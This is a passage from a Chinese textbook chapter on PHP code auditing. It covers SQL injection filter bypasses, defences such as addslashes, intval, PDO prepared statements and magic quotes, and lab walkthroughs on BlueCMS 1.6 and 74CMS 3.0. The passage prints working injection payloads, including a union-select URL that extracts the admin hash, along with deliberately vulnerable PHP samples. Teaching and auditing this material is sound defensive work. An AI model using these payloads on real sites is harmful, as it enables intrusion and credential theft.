\uFF081\uFF09  Base64\u89E3\u7801\u7ED5\u8FC7\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php\r
\r
$link = mysql_connect('localhost', 'root', 'root') or die('bad!');\r
\r
mysql_query("SET NANES 'gbk'");\r
\r
mysql_select_db("test",$link);\r
\r
$username=$_REQUEST['username'];\r
\r
**$username=addslashes($username);**\r
\r
**//\u5C06\u7528\u6237\u540D\u4E2D\u5B57\u7B26\\\\\u3001/\u3001\u7A7A\u683C\u66FF\u6362\u4E3A\u7A7A\u5B57\u7B26**\r
\r
**$username=str_replace(array("\\\\","/"," "),array("","",""),$username);**\r
\r
$password=md5($_REQUEST ['password']);\r
\r
**$sql="select count(\\*) as num from admin where name='".$username."' and pass='".$password.".";**\r
\r
$query=mysql_query($sql);\r
\r
$res=mysql_fetch_array($query);\r
\r
$count=$res['num'];\r
\r
if($count==1){echo "login success";}else{echo "login failed";}?>\r
\r
\r
\r
\uFF082\uFF09  \u5229\u7528\u65B9\u6CD5\uFF1A\r
\r
\u9884\u62FC\u51D1\u7684SQL\u8BED\u53E5\u4E3A\u201Cselect count(*) as num from admin where name=\u2019admin\u2019# ' and pass='$password\u2019\u201D\u3002\u5047\u8BBE\u7684$username\u53C2\u6570\u503C\u4E3Aadmin\u2019#\u3002\u7ECF\u8FC7addslashes\u8FC7\u6EE4\u540E\u8BE5\u53C2\u6570\u503C\u4ECE\u201Cadmin\u2019#\u201D\u8F6C\u5316\u4E3A\u201Cadmin/\u2019#\u201D\u3002str_replace\u51FD\u6570\u5C06\\\u3001/\u3001\u7A7A\u683C\u66FF\u6362\u4E3A\u7A7A\u5B57\u7B26\uFF0C\u56E0\u6B64\u66FF\u6362\u540E\u7ED3\u679C\u4E3A\u201Cadmin\u2019#\u201D\uFF0C\u53EF\u62FC\u51D1\u51FASQL\u8BED\u53E5\u6CE8\u5165\u6210\u529F\u3002\r
\r
\u53D1\u9001\u7684HTTP\u8BF7\u6C42\u8DEF\u5F84\u4E3A\u201C192.168.0.10/ /index4.php?username=admin%27%20%23&password=test\u201D\uFF0C\u6D4B\u8BD5\u7ED3\u679C\u5982\u56FE3-9\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image188.jpg)\r
\r
\u56FE3-9 \u5B57\u7B26\u4E32\u66FF\u6362\u6D4B\u8BD5\u56FE\r
\r
## 3.4 SQL\u6CE8\u5165\u9632\u5FA1\r
\r
\u5BF9\u4E8ESQL\u6CE8\u5165\u6F0F\u6D1E\u9632\u5FA1\uFF0C\u5206\u4E3A\uFF1A\u4EE3\u7801\u5C42\u9632\u5FA1\u3001\u914D\u7F6E\u5C42\u9632\u5FA1\u3001\u7269\u7406\u5C42\u3002\r
\r
1\u3001\u4EE3\u7801\u5C42\u9632\u5FA1\r
\r
\uFF081\uFF09  PHP\u901A\u7528\u8FC7\u6EE4\u51FD\u6570\r
\r
PHP\u5185\u7F6E\u4E86\u4E00\u4E9B\u8FC7\u6EE4\u51FD\u6570\u53EF\u6709\u6548\u65B9\u5F0FSQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u6709\u4E9B\u51FD\u6570\u5728\u4E0A\u6587\u5DF2\u7ECF\u63D0\u5230\u8FC7\uFF0C\u4F46\u672A\u8FDB\u884C\u8BE6\u7EC6\u4ECB\u7ECD\u3002\u4E0B\u9762\u4ECB\u7ECD\u5E38\u7528\u5185\u7F6E\u8FC7\u6EE4\u51FD\u6570mysql_[real_]escape_string \u3001intval\u3001addslashes\u3002\r
\r
l addslashes\u51FD\u6570\r
\r
\u8BE5\u51FD\u6570\u7684\u8FC7\u6EE4\u6548\u679C\u4E0EGPC\u76F8\u540C\uFF0C\u8FC7\u6EE4\u7684\u9884\u5B9A\u4E49\u5B57\u7B26\u5305\u62EC\uFF1A\u5355\u5F15\u53F7\u3001\u53CC\u5F15\u53F7\u3001\u53CD\u659C\u6760\u3001NULL\u3002\u5927\u591A\u6570\u7A0B\u5E8F\u51FD\u6570\u5165\u53E3\u90FD\u4F7F\u7528\u8BE5\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\u3002\u4F46\u662F\u8BE5\u51FD\u6570\u4F9D\u65E7\u53EA\u80FD\u8F6C\u79FB\u5B57\u7B26\u578B\u6570\u636E\uFF0C\u5BF9\u6570\u5B57\u578B\u6570\u636E\u65E0\u6CD5\u8FDB\u884C\u8FC7\u6EE4\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FAaddslashes\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php \r
\r
$username="'\\"\\\\";\r
\r
echo "unfilte : ".$username."</br>";\r
\r
**$username=addslashes($username);**\r
\r
echo "filted : ".$username;\r
\r
?>\r
\r
\r
\r
\u6267\u884C\u7ED3\u679C\uFF1A\r
\r
unfilte : **'"\\**\r
\r
filted : **\\'\\"\\\\**\r
\r
l Intval\u51FD\u6570\r
\r
\u5E38\u89C1\u7684\u6570\u5B57\u578BSQL\u6CE8\u5165\u53EF\u4F7F\u7528\u62A5\u9519\u6CE8\u5165\u6216\u76F2\u6CE8\u7684\u65B9\u5F0F\u6765\u8FDB\u884C\u7ED5\u8FC7\u3002\u800C\u4E3A\u4E86\u9632\u5FA1\u8FD9\u7C7B\u6CE8\u5165\uFF0Cintval\u7B49\u51FD\u6570\u53EF\u4EE5\u8D77\u5230\u91CD\u8981\u7684\u4F5C\u7528\u3002Intval\u7684\u4F5C\u7528\u662F\u5C06\u53D8\u91CF\u8F6C\u6362\u4E3Aint\u7C7B\u578B\u3002\u4E0B\u9762\u7ED9\u51FAIntval\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php \r
\r
$id="1 union select xxx";\r
\r
echo "unfilte : ".$id."</br>";\r
\r
**$id=intval($id);**\r
\r
echo "filted : ".$id;\r
\r
?>\r
\r
\r
\r
\u6267\u884C\u7ED3\u679C\uFF1A\r
\r
unfilte : **1 union select xxx**\r
\r
filted : **1**\r
\r
l Mysql_[real_]escape_string\u51FD\u6570\r
\r
Mysql_escape_string\u548Cmysql_real_escape_string\u51FD\u6570\u5C06\u5BF9\u7279\u6B8A\u5B57\u7B26\u4E32\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u7279\u6B8A\u5B57\u7B26\u4E32\u5305\u62EC\uFF1A[\\x00][\\n][\\r][\\][\u2018][\u201C][\\x1a]\uFF0C\u4E24\u4E2A\u51FD\u6570\u552F\u4E00\u4E0D\u540C\u7684\u662Fmysql_real_escape_string\u51FD\u6570\u63A5\u6536\u7684\u662F\u4E00\u4E2A\u8FDE\u63A5\u53E5\u67C4\u5E76\u6839\u636E\u5F53\u524D\u5B57\u7B26\u96C6\u8F6C\u4E49\u5B57\u7B26\u4E32\u3002\u7531\u4E8E\u8BE5\u51FD\u6570\u53EF\u9632\u5FA1\u7684\u7279\u6B8A\u5B57\u7B26\u6709\u9650\uFF0C\u8BE5\u51FD\u6570\u540C\u6837\u65E0\u6CD5\u9632\u5FA1\u65E0\u5355\u5F15\u53F7\u4FDD\u62A4\u7684\u6570\u5B57\u578BSQL\u6CE8\u5165\u3002\u4E0B\u9762\u7ED9\u51FA\u4F7F\u7528\u6848\u4F8B\uFF1A\r
\r
\r
\r
<?php\r
\r
$con = mysql_connect("localhost","root","123456");\r
\r
$id = mysql_real_escape_string($_GET['id'],$con);\r
\r
$sql = "select * from test where id ='".$id."'";\r
\r
echo $sql;\r
\r
?>\r
\r
\r
\r
  \u5F53\u8BF7\u6C42\u8BE5\u6587\u4EF6?id=1\u2019\u65F6\uFF0C\u53C2\u6570\u901A\u8FC7mysql_real_escape_string\u8FC7\u6EE4\u540E\uFF0C\u62FC\u63A5\u7684SQL\u8BED\u53E5\u5C06\u8F93\u51FA\u4E3Aselect * from test where id=\u20191\\"\u3002\r
\r
\uFF082\uFF09  PDO\u9884\u7F16\u8BD1\u9632\u5FA1\r
\r
\u4F7F\u7528PDO\u8FDB\u884C\u9884\u7F16\u8BD1\u53EF\u4EE5\u4F7F\u7528PDO\u65B9\u5F0F\u5BF9SQL\u8BED\u53E5\u8FDB\u884C\u9884\u7F16\u8BD1\uFF0C\u4ECE\u800C\u5728\u6267\u884C\u4EE3\u7801\u9636\u6BB5SQL\u8BED\u53E5\u65E0\u6CD5\u53D1\u751F\u53D8\u5316\uFF0C\u7406\u8BBA\u4E0A\u53EF\u4EE5\u963B\u6321\u4EFB\u4F55SQL\u6CE8\u5165\u653B\u51FB\u3002\r
\r
PDO\u662F\uFF08PHP Data Objects\uFF09\u662F\u5728PHP5.1\u7248\u672C\u4E4B\u540E\u5F00\u59CB\u652F\u6301\u7684\u3002PDO\u53EF\u4EE5\u88AB\u770B\u4F5C\u662Fphp\u63D0\u4F9B\u7684\u4E00\u4E2A\u7C7B\uFF0C\u5B83\u63D0\u4F9B\u4E86\u4E00\u7EC4\u6570\u636E\u5E93\u62BD\u8C61\u5C42API\uFF0C\u4F7F\u5F97\u7F16\u5199PHP\u4EE3\u7801\u4E0D\u518D\u5173\u5FC3\u5177\u4F53\u8981\u8FDE\u63A5\u7684\u6570\u636E\u5E93\u7C7B\u578B\u3002\u4F7F\u7528PDO\u65E2\u53EF\u4EE5\u8FDE\u63A5mysql\u4E5F\u53EF\u4EE5\u7528\u5B83\u8FDE\u63A5oracle\u3002\u5E76\u4E14PDO\u5F88\u597D\u7684\u89E3\u51B3\u4E86SQL\u6CE8\u5165\u95EE\u9898\u3002\r
\r
\u56FE3-10\u7ED9\u51FAPDO\u9884\u7F16\u8BD1\u53CA\u6267\u884CSQL\u7684\u8FC7\u7A0B\uFF1A\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image190.jpg)\r
\r
\u56FE3-10 PDO\u9884\u7F16\u8BD1\u6267\u884C\u8FC7\u7A0B\u56FE\r
\r
PDO\u4E0D\u4F1A\u5728\u672C\u5730\u5BF9SQL\u8FDB\u884C\u62FC\u63A5\u7136\u540E\u5C06\u62FC\u63A5\u540E\u7684SQL\u4F20\u9012\u7ED9mysql \u670D\u52A1\u5668\u5904\u7406\uFF08\u5373\u4E0D\u4F1A\u5728\u672C\u5730\u505A\u8F6C\u4E49\u5904\u7406\uFF09\u3002\r
\r
l PDO\u7684\u5904\u7406\u65B9\u6CD5\u662F\u5728\u9884\u5904\u7406\u51FD\u6570prepare\u8C03\u7528\u65F6\uFF0C\u5C06\u9884\u5904\u7406\u597D\u7684SQL\u6A21\u677F\uFF08\u5305\u542B\u5360\u4F4D\u7B26\uFF09\u901A\u8FC7mysql\u534F\u8BAE\u4F20\u9012\u7ED9mysql\u670D\u52A1\u5668\u3002\u9884\u7559\u7684\u503C\u4F7F\u7528\u53C2\u6570\u201C?\u201D\u6807\u8BB0\uFF0C\u4F8B\u5982\uFF1Ainsert into test(name,passwd) values(?,?)\u3002\r
\r
l \u5F53\u8C03\u7528\u6267\u884C\u51FD\u6570execute\u65F6\uFF0C\u5C06\u4E24\u4E2A\u53C2\u6570\u4F20\u9012\u7ED9mysql\u670D\u52A1\u5668\u3002\u7531mysql\u670D\u52A1\u5668\u5B8C\u6210\u53D8\u91CF\u7684\u8F6C\u79FB\u5904\u7406\uFF0C\u5C06\u5E94\u7528\u7ED1\u5B9A\u7684\u503C\u4F20\u9012\u7ED9\u53C2\u6570\uFF0C\u6267\u884CSQL\u8BED\u53E5\u3002\u5C06SQL\u6A21\u677F\u548C\u53D8\u91CF\u5206\u4E24\u6B21\u4F20\u9012\uFF0C\u5373\u89E3\u51B3\u4E86SQL\u6CE8\u5165\u95EE\u9898\u3002\r
\r
\u4F7F\u7528PDO\u9884\u7F16\u8BD1\u7684\u4F18\u70B9\u5982\u4E0B\uFF1A\r
\r
l \u9884\u7F16\u8BD1\u8BED\u53E5\u5927\u5927\u51CF\u5C11\u4E86\u5206\u6790\u65F6\u95F4\uFF0C\u53EA\u505A\u4E86\u4E00\u6B21\u67E5\u8BE2\u3002\r
\r
l \u7ED1\u5B9A\u53C2\u6570\u51CF\u5C11\u4E86\u670D\u52A1\u5668\u5E26\u5BBD\uFF0C\u53EA\u9700\u8981\u53D1\u9001\u67E5\u8BE2\u7684\u53C2\u6570\uFF0C\u800C\u4E0D\u662F\u6574\u4E2A\u8BED\u53E5\u7F16\u8BD1\u8FC7\u7A0B\u5DF2\u7ECF\u786E\u5B9ASQL\u6267\u884C\u8BED\u53E5\uFF0C\u7406\u8BBA\u4E0A\u53EF\u4EE5\u963B\u6321\u4EFB\u4F55SQL\u6CE8\u5165\u3002\r
\r
\uFF083\uFF09  \u5BBD\u5B57\u8282\u6CE8\u5165\u9632\u5FA1\r
\r
\u4E00\u822C\u6765\u8BF4\u5BBD\u5B57\u8282\u6CE8\u5165\u9632\u5FA1\u65B9\u6CD5\u5305\u62EC\uFF1A\r
\r
l \u5728\u6240\u6709\u7684SQL\u8BED\u53E5\u524D\u6307\u5B9A\u8FDE\u63A5\u7684\u5F62\u5F0F\u8BBE\u7F6E\u4E3ABinary\u4E8C\u8FDB\u5236\uFF0C\u4F7F\u7528character_set_client\u8BBE\u7F6E\u4E8C\u8FDB\u5236\u3002\u8BE5\u65B9\u6CD5\u7ECF\u5E38\u4F7F\u7528\uFF0C\u4F8B\u5982\uFF1A\r
\r
mysql_query("SET character_set_connection=gbk, character_set_results=gbk,**character_set_client=binary**", $conn);\r
\r
l \u4F7F\u7528mysql_set_charset(\u2018gbk\u2019)\u8BBE\u7F6E\u7F16\u7801\uFF0C\u7136\u540E\u4F7F\u7528mysql_real_escape_string()\u51FD\u6570\u88AB\u53C2\u6570\u8FC7\u6EE4\u3002\u867D\u7136\u8BE5\u65B9\u6CD5\u53EF\u884C\uFF0C\u4F46\u5F88\u591A\u7F51\u7AD9\u4F9D\u65E7\u4F7F\u7528addslashes()\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u5728PHP7.0\u540E\u79FB\u9664\u3002\r
\r
l \u8BBE\u7F6ESQL\u8FDE\u63A5\u4E3AUTF-8\u7F16\u7801\u3002Mysqli_query(link,\u2019SET NAMES UTF-8\u2019)\u3002\r
\r
2\u3001 \u914D\u7F6E\u5C42\u9632\u5FA1\r
\r
\uFF081\uFF09\u9B54\u672F\u5F15\u53F7\u9632\u5FA1\r
\r
\u6B64\u9632\u5FA1\u673A\u5236\u5728\u4E66\u201C1.4\u5F71\u54CD\u4EE3\u7801\u5BA1\u8BA1\u7684\u914D\u7F6E\u201D\u4ECB\u7ECD\uFF0C\u901A\u8FC7\u914D\u7F6E\u5C06\u5355\u5F15\u53F7\u3001\u53CC\u5F15\u53F7\u3001\u53CD\u659C\u6760\u53CA\u7A7A\u5B57\u7B26NULL\u8FDB\u884C\u8F6C\u4E49\u3002\u4E0B\u9762\u7ED9\u51FA\u9B54\u672F\u5F15\u53F7\u914D\u7F6E\u9009\u9879\uFF1A\r
\r
l Magic_quotes_gpc\uFF1A\u5BF9GET\u3001POST\u3001Cookie\u7B49\u53C2\u6570\u7684\u503C\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u53EF\u6709\u6548\u9632\u5FA1\u5B57\u7B26\u578B\u6CE8\u5165\u6F0F\u6D1E\uFF1B\r
\r
l Magic_quotes_runtime\uFF1A\u5BF9\u6570\u636E\u5E93\u6216\u6587\u4EF6\u4E2D\u83B7\u53D6\u7684\u6570\u636E\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u53EF\u6709\u6548\u9632\u5FA1FILE\u6CE8\u5165\u6F0F\u6D1E\uFF08FILE\u6CE8\u5165\u662F\u6587\u4EF6\u4E0A\u4F20\u65F6\u5C06\u6587\u4EF6\u540D\u5B58\u5165\u5230\u6570\u636E\u5E93\u4E2D\uFF0C\u800C\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u4FEE\u6539\u6587\u4EF6\u540D\u5B8C\u6210SQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u60C5\u51B5\uFF09\u3002\`\`\r
\r
\u901A\u8FC7\u5F00\u542F\u4E0A\u8FF0\u914D\u7F6E\u53EF\u4E00\u5B9A\u7A0B\u5EA6\u4E0A\u9632\u6B62HTTP\u4F20\u9012\u53C2\u6570\u6CE8\u5165\u53CA\u6587\u4EF6\u540D\u6CE8\u5165\u7B49\u6F0F\u6D1E\u3002\u4F46\u662F\u8BE5\u914D\u7F6E\u65E0\u6CD5\u9632\u6B62\u6570\u5B57\u578B\u6CE8\u5165\u7C7B\u578B\u6F0F\u6D1E\u3002\r
\r
3\u3001\u7269\u7406\u5C42\u9632\u5FA1\r
\r
\u4E3A\u7F51\u7EDC\u8BBE\u5907\u52A0\u88C5WAF\u3001\u4E91\u9632\u62A4\u3001IPS\u7B49\u7CFB\u7EDF\uFF0C\u9632\u5FA1SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
## 3.5 SQL\u6CE8\u5165CMS\u5B9E\u8DF5\r
\r
### 3.5.1  \u5B9E\u9A8C\uFF1ABlueCMS1.6 Union\u6CE8\u5165\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u5BF9BlueCMS1.6\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u8BE5CMS1.6\u7248\u672C\u81EA\u53D1\u5E03\u4EE5\u6765\u5B58\u5728\u5F88\u591A\u6F0F\u6D1E\uFF0C\u672C\u5B9E\u9A8C\u4EE5ad_js.php\u6587\u4EF6\u7684Union\u6CE8\u5165\u4E3A\u6848\u4F8B\u8FDB\u884C\u5206\u6790\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80033.2.1\u8282\uFF1A\u65E0\u8FC7\u6EE4\u53C2\u6570\u6CE8\u5165\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u6570\u5B57\u578BSQL\u6CE8\u5165\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BBlueCMS1.6\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\uFF1BSeay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
l \u5BF9BlueCMS\u5168\u5C40\u8FC7\u6EE4\u8FDB\u884C\u4E86\u89E3\u3002\r
\r
\u5BF9/uploads/include/common.inc.php\u6587\u4EF6\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u9996\u5148\u4F7F\u7528require_once\u51FD\u6570\u5305\u542B\u901A\u7528\u51FD\u6570\uFF0C\u7136\u540E\u5224\u65ADgpc\u5F00\u542F\u60C5\u51B5\uFF0C\u82E5\u672A\u5F00\u542Fgpc\u5219\u8C03\u7528deep_addslashes\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u5982\u56FE3-11\u6240\u793A\u3002\r
\r
deep_addslashes\u51FD\u6570\u4F1A\u5224\u65AD$str\u662F\u5426\u4E3A\u6570\u7EC4\uFF0C\u5982\u679C\u662F\u6570\u7EC4\u5219\u9012\u5F52\u8C03\u7528deep_addslashes\u51FD\u6570\uFF0C\u76F4\u81F3\u4E3A\u5B57\u7B26\u4E32\u518D\u8C03\u7528addslashes\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\u3002\u5982\u679C\u662F\u5B57\u7B26\u4E32\u5219\u76F4\u63A5\u4F7F\u7528addslashes\u8FDB\u884C\u8FC7\u6EE4\u3002\u81F3\u6B64\uFF0C\u57FA\u672C\u4E86\u89E3\u4E86\u8BE5CMS\u4E2D\u7684\u5168\u5C40\u8FC7\u6EE4\u529F\u80FD\uFF0C\u5373\u4EE5POST\u3001GET\u3001COOKIE\u3001REQUEST\u65B9\u5F0F\u4F20\u9012\u7684\u53C2\u6570\u5C06\u88ABaddslashes\u51FD\u6570\u8FC7\u6EE4\u3002\u8BE5\u51FD\u6570\u4EE3\u7801\u5982\u56FE3-12\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image192.gif)\r
\r
\u56FE3-11 common.inc.php\u4EE3\u7801\u56FE\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image194.gif)\r
\r
\u56FE3-12 deep_addslashes\u51FD\u6570\u56FE\r
\r
l \u5B9A\u4F4D\u6F0F\u6D1E\r
\r
\u5168\u5C40\u641C\u7D22GET\u65B9\u5F0F\u4F20\u9012\u7684\u6570\u5B57\u578BSQL\u6CE8\u5165\uFF0C\u67E5\u770B\u53C2\u6570\u662F\u5426\u88ABintval\u51FD\u6570\u8FDB\u884C\u9632\u5FA1\u8FC7\u6EE4\u3002\uFF08PhpStorm\u5FEB\u6377\u952E\u4E3ACTRL+SHIFT+F\uFF09\uFF0C\u4E5F\u53EF\u4F7F\u7528Seay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u76F4\u63A5\u81EA\u52A8\u626B\u63CF\u5BA1\u8BA1\u7ED3\u679C\uFF0C\u4ECE\u800C\u52A0\u5FEB\u68C0\u7D22\u901F\u5EA6\uFF0CPhpStorm\u5168\u5C40\u641C\u7D22\u7ED3\u679C\u5982\u56FE3-13\u6240\u793A\uFF0C\u6F0F\u6D1E\u5B9A\u4F4D\u81F3ad_js.php\u6587\u4EF6\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image196.jpg)\r
\r
\u56FE3-13 \u5168\u5C40\u641C\u7D22$_GET\u56FE\r
\r
ad_js.php\u6587\u4EF6\u4EE3\u7801\u5982\u56FE3-14\u6240\u793A\uFF0C\u5BF9\u53C2\u6570ad_id\u8FDB\u884C\u6570\u636E\u6D41\u5206\u6790\u3002\u9996\u5148\u5224\u65ADad_id\u662F\u5426\u4E3A\u7A7A\uFF0C\u5982\u679C\u4E3A\u7A7A\u5219\u62A5\u9519\u3002\u5982\u679C\u4E0D\u4E3A\u7A7A\u5219\u4F7F\u7528trim\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\uFF08trim\u51FD\u6570\u662F\u79FB\u9664\u5B57\u7B26\u4E32\u4E24\u4FA7\u7684\u7A7A\u767D\u5B57\u7B26\u6216\u5176\u4ED6\u9884\u5B9A\u4E49\u5B57\u7B26\uFF09\uFF0C\u7136\u540E\u6267\u884CSQL\u8BED\u53E5select * from ad where ad_id = $ad_id\u3002\u7531\u4E8E\u53C2\u6570$ad_id\u53EA\u8FDB\u884C\u4E86trim\u8FC7\u6EE4\u800C\u672A\u4F7F\u7528intval\u51FD\u6570\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u5176\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image198.jpg)\r
\r
\u56FE3-14 ad_js.php\u53C2\u6570\u4F20\u9012\u56FE\r
\r
\uFF082\uFF09\u6D4B\u8BD5\u5229\u7528\u9636\u6BB5\r
\r
\u4F7F\u7528order by\u6D4B\u8BD5\u80FD\u5426\u88AB\u6CE8\u5165\uFF0C\u901A\u8FC7Seay\u5BA1\u8BA1\u5DE5\u5177\u76D1\u63A7\u6570\u636E\u5E93\u6267\u884C\u3002\u6D4B\u8BD5payload\u4E3A\uFF1Ahttp://192.168.0.11/blue/ad_js.php?ad_id=-1 order by 9#\u3002\u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7\u5982\u56FE3-15\u6240\u793A\uFF0C\u6210\u529F\u62FC\u63A5SQL\u8BED\u53E5SELECT * FROM blue_ad WHERE ad_id =-1 order by 9\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image200.jpg)\r
\r
\u56FE3-15 \u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7\u56FE\r
\r
\u8BE5CMS\u7684blue\u6570\u636E\u5E93\u4E2D\u5B58\u5728\u8868blue_admin\u3002\u8BE5\u8868\u4E2D\u5B58\u50A8\u7740\u8BE5\u7CFB\u7EDF\u7684\u7BA1\u7406\u5458\u8D26\u6237\u5BC6\u7801\uFF0C\u6784\u9020SQL\u8BED\u53E5\u4E3A\uFF1ASELECT * FROM blue_ad WHERE ad_id =-1 union select 1,2,3,4,5,6,concat(admin_name,#,pwd) from blue_admin limit 0,1#\u3002\r
\r
\u6D4B\u8BD5payload\u4E3A\uFF1Ahttp://192.168.0.11/blue/ad_js.php?ad_id=-1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%200,1#\u3002\r
\r
\u6D4B\u8BD5\u7ED3\u679C\u5982\u56FE3-16\u6240\u793A\uFF0C\u7528\u6237\u540D\u4E3Aadmin\u5BC6\u780121232f297a57a5a743894a0e4a801fc3\u3002\u5F88\u660E\u663E\u8BE5\u5BC6\u7801\u88AB\u52A0\u5BC6\u8FC7\uFF0C\u540E\u53F0\u4EE3\u7801\u67E5\u770B\u5BC6\u7801\u52A0\u5BC6\u7B97\u6CD5\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image202.jpg)\r
\r
\u56FE3-16 \u524D\u53F0\u4EE3\u7801\u6D4B\u8BD5\u7ED3\u679C\u56FE\r
\r
admin/user.php\u6587\u4EF6\u7684\u7528\u6237\u6CE8\u518C\u529F\u80FD\uFF0C\u7A0B\u5E8F\u5C06\u5BC6\u7801pasword\u8FDB\u884Cmd5\u52A0\u5BC6\uFF0C\u7136\u540E\u5C06\u7528\u6237\u4FE1\u606F\u5B58\u653E\u81F3user\u8868\uFF0C\u5982\u56FE3-17\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image204.jpg)\r
\r
\u56FE3-17 user.php\u6587\u4EF6\u56FE\r
\r
\u4F7F\u7528\u5728\u7EBFmd5\u89E3\u5BC6\u5DE5\u5177\uFF0C\u89E3\u5BC6\u540E\u7684\u7ED3\u679C\u4E3Aadmin\uFF0C\u5982\u56FE3-18\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image206.jpg)\r
\r
\u56FE3-18 md5\u89E3\u7801\u56FE\r
\r
### 3.5.2  \u5B9E\u9A8C\uFF1A74CMS3.0 \u5BBD\u5B57\u8282\u6CE8\u5165\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF974CMS3.0\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u672C\u6B21\u5B9E\u9A8C\u4EE5admin_login.php\u6587\u4EF6\u4E2D\u767B\u5F55\u529F\u80FD\u7684\u5BBD\u5B57\u8282\u6CE8\u5165\u4E3A\u6848\u4F8B\u8FDB\u884C\u5206\u6790\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80033.5.1\u8282\uFF1A\u5BBD\u5B57\u8282\u6CE8\u5165\u7ED5\u8FC7\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u6570\u5B57\u578BSQL\u4E2D\u5BBD\u5B57\u8282\u6CE8\u5165\u7ED5\u8FC7addslashes\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B74CMS3.0\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\uFF1BSeay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
l \u5BF974CMS3.0\u5168\u5C40\u8FC7\u6EE4\u8FDB\u884C\u4E86\u89E3\u3002\r
\r
\u5168\u5C40\u914D\u7F6E\u6587\u4EF6admin_common_inc.php\u4E2D\u67E5\u770B\u5168\u5C40\u8FC7\u6EE4\u51FD\u6570\u5B9E\u73B0\u3002\u9996\u5148\u5224\u65ADgpc\u5F00\u542F\u60C5\u51B5\uFF0C\u82E5\u4E3A\u5F00\u542FGCP\u5219\u8C03\u7528admin_addslashes_deep\u51FD\u6570\u8FC7\u6EE4\u8BF7\u6C42\u4F20\u53C2\u6570\u636E\uFF0C\u5982\u56FE3-19\u6240\u793A\u3002\r
\r
\u67E5\u770Badmin_addslashes_deep\u51FD\u6570\uFF0C\u9996\u5148\u5224\u65AD$value\u53D8\u91CF\u662F\u5426\u4E3A\u7A7A\uFF0C\u5982\u679C\u4E0D\u4E3A\u7A7A\u5219\u5224\u65AD$value\u662F\u5426\u4E3A\u6570\u7EC4\uFF0C\u9012\u5F52\u8C03\u7528admin_addslashes_deep\u51FD\u6570\uFF0C\u76F4\u81F3\u4F20\u9012\u53C2\u6570$value\u90FD\u901A\u8FC7addslashes\u51FD\u6570\u8FC7\u6EE4\uFF0C\u5982\u56FE3-20\u6240\u793A\u3002\r
